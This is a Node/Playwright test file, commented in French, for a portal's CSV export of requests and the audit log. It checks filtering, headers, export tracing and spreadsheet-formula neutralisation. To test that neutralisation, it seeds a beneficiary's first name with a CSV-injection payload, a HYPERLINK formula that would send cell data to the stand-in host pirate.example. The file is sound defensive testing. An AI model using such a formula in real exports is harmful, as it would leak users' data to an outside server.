/*
 * Export CSV des demandes et du journal : respect des filtres, neutralisation
 * des formules de tableur, traçabilité de l'extraction.
 */
const os = require('os'), fs = require('fs'), path = require('path');
const { RACINE, CHROMIUM } = require('../lib/harnais');
const { SORTIES: D } = require('../lib/harnais');
process.env.DATA_DIR = fs.mkdtempSync(path.join(os.tmpdir(), 'export-'));
process.env.PORT = '3962';
process.env.ADMIN_PASSWORD = 'demo123';
process.env.AUTOMATION_MODE = 'demo';
process.env.WORKER_POLL_MS = '600000';
process.env.WORKER_DEMARRAGE_MS = '0';
process.env.APPS_ACTIVES = 'bluekango,netsoins';

const db = require(path.join(RACINE, 'src/db'));
let ok = true;
const dit = (b, t) => { if (!b) ok = false; console.log(`  ${b ? '✓' : '✗'} ${t}`); };
const titre = (t) => console.log(`\n— ${t} —`);

// Un bénéficiaire au nom « piégé » : dans un tableur, « =1+1 » serait CALCULÉ,
// et la formule HYPERLINK exfiltrerait la ligne vers un serveur distant.
const PIEGE = '=HYPERLINK("http://pirate.example/"&A1,"cliquez")';
const refs = [];
refs.push(db.createRequest('netsoins', 'NS', {
  nom: 'PIEGE', prenom: PIEGE, email: 'paul@adef.fr', etablissement: '778',
  fonction: 'AIDE SOIGNANT (E)',
}, 'Claire Durand', 'c@adef.fr', '1.1.1.1', 'creation'));
refs.push(db.createRequest('bluekango', 'BKG', {
  nom: 'DUPONT', prenom: 'Marie', email: 'marie@adef.fr', etablissement: '71',
  fonction: 'AIDE SOIGNANT (E)',
}, 'Claire Durand', 'c@adef.fr', '1.1.1.1', 'creation'));

const Database = require(path.join(RACINE, 'node_modules/better-sqlite3'));
const conn = new Database(path.join(process.env.DATA_DIR, 'portail.db'));
conn.prepare("UPDATE requests SET status='terminee', started_at=datetime('now','-2 minutes'), finished_at=datetime('now'), generated_login='ppiege' WHERE reference=?").run(refs[0]);
conn.prepare("UPDATE requests SET status='echec', result_message='Échec de test' WHERE reference=?").run(refs[1]);
conn.close();
db.audit('admin', 'connexion', 'admin', 'Connexion réussie', '10.0.0.1');
db.audit('admin', 'suppression_admin', 'bob', 'Compte supprimé', '10.0.0.2');

require(path.join(RACINE, 'src/server'));
const { chromium } = require(path.join(RACINE, 'node_modules/playwright'));

setTimeout(async () => {
  const b = await chromium.launch({ executablePath: CHROMIUM });
  const ctx = await b.newContext({ viewport: { width: 1280, height: 900 }, acceptDownloads: true });
  await ctx.route('**', (r) => (r.request().url().includes('localhost') ? r.continue() : r.abort()));
  const p = await ctx.newPage();
  const err = [];
  p.on('pageerror', (e) => err.push(e.message));
  await p.goto('http://localhost:3962/login.html', { waitUntil: 'domcontentloaded' });
  await p.fill('#username', 'admin'); await p.fill('#password', 'demo123');
  await p.click('button[type="submit"]'); await p.waitForTimeout(1600);

  const telecharger = async (bouton) => {
    const [dl] = await Promise.all([p.waitForEvent('download', { timeout: 10000 }), p.click(bouton)]);
    const chemin = path.join(D, dl.suggestedFilename());
    await dl.saveAs(chemin);
    return { nom: dl.suggestedFilename(), texte: fs.readFileSync(chemin, 'utf8') };
  };

  titre('1. Export des demandes — toutes');
  await p.click('#nav-requests'); await p.waitForTimeout(900);
  let out = await telecharger('#export-requests');
  dit(/^demandes-\d{8}-\d{4}\.csv$/.test(out.nom), `fichier : ${out.nom}`);
  let lignes = out.texte.trim().split('\r\n');
  dit(lignes.length === 3, `${lignes.length - 1} demandes exportées (2 attendues)`);
  dit(out.texte.charCodeAt(0) === 0xFEFF, 'BOM UTF-8 présent (accents lisibles dans Excel)');
  dit(lignes[0].includes('"Référence";') && lignes[0].includes('"Durée du robot (s)"'),
    `en-têtes : ${lignes[0].slice(0, 90).replace(/^﻿/, '')}…`);

  titre('2. Aucune formule exécutable');
  const ligneP = lignes.find((l) => l.includes('HYPERLINK'));
  dit(!!ligneP, 'le nom piégé est bien présent dans l’export');
  dit(/;"'=HYPERLINK/.test(ligneP), `il est neutralisé par une apostrophe : ${(ligneP.match(/"[^"]*HYPERLINK[^"]*"/) || [''])[0].slice(0, 70)}`);
  dit(!/;"=/.test(out.texte), 'aucune cellule ne commence par « = » sans protection');

  titre('3. Les filtres sont respectés');
  await p.click('.chip[data-status="echec"]'); await p.waitForTimeout(500);
  out = await telecharger('#export-requests');
  lignes = out.texte.trim().split('\r\n');
  dit(lignes.length === 2, `filtre « Échecs » : ${lignes.length - 1} ligne exportée`);
  dit(lignes[1].includes('DUPONT') && !lignes[1].includes('HYPERLINK'),
    'c’est bien la demande en échec, et elle seule');

  await p.click('.chip[data-status=""]'); await p.waitForTimeout(400);
  await p.fill('#search', 'marie'); await p.waitForTimeout(500);
  out = await telecharger('#export-requests');
  dit(out.texte.trim().split('\r\n').length === 2, 'la recherche texte filtre aussi l’export');
  await p.fill('#search', ''); await p.waitForTimeout(400);

  titre('4. Export du journal');
  await p.click('#nav-journal'); await p.waitForTimeout(1000);
  out = await telecharger('#export-journal');
  dit(/^journal-\d{8}-\d{4}\.csv$/.test(out.nom), `fichier : ${out.nom}`);
  const jl = out.texte.trim().split('\r\n');
  dit(jl[0].replace(/^﻿/, '') === '"Date";"Acteur";"Action";"Cible";"Détails";"IP"', `en-têtes : ${jl[0].replace(/^﻿/, '')}`);
  dit(jl.length >= 3, `${jl.length - 1} lignes de journal`);
  await p.fill('#journal-search', 'suppression'); await p.waitForTimeout(500);
  out = await telecharger('#export-journal');
  const filtre = out.texte.trim().split('\r\n');
  dit(filtre.length === 2 && filtre[1].includes('bob'), `filtré : ${filtre.length - 1} ligne — ${filtre[1].slice(0, 60)}`);

  titre('5. L’extraction laisse une trace');
  await p.fill('#journal-search', 'Export'); await p.waitForTimeout(800);
  const traces = await p.$$eval('#journal-rows tr', (trs) => trs.map((t) => t.innerText.replace(/\s+/g, ' ').trim()));
  // Le journal a été chargé AVANT les deux exports de journal : seuls les
  // exports de demandes qui les précèdent peuvent y figurer.
  dit(traces.length >= 3, `${traces.length} exports de demandes journalisés`);
  const t0 = traces.find((t) => /Demandes/.test(t)) || '';
  dit(/Export CSV/.test(t0) && /ligne/.test(t0), `trace : ${t0.slice(0, 120)}`);
  dit(!/HYPERLINK|DUPONT|paul@adef/.test(traces.join(' ')),
    'la trace ne contient aucune donnée personnelle — seulement le geste');
  const avecFiltre = traces.find((t) => /filtres/.test(t)) || '';
  dit(!!avecFiltre, `les filtres employés sont notés : ${avecFiltre.slice(60, 170)}`);

  await p.screenshot({ path: `${D}export-journal.png`, fullPage: true });
  console.log('\nerreurs console :', err.length ? err : 'aucune');
  await b.close();
  console.log(ok ? '\n>>> Export CSV conforme ✓' : '\n>>> DES CAS ONT ÉCHOUÉ');
  process.exit(ok ? 0 : 1);
}, 1500);
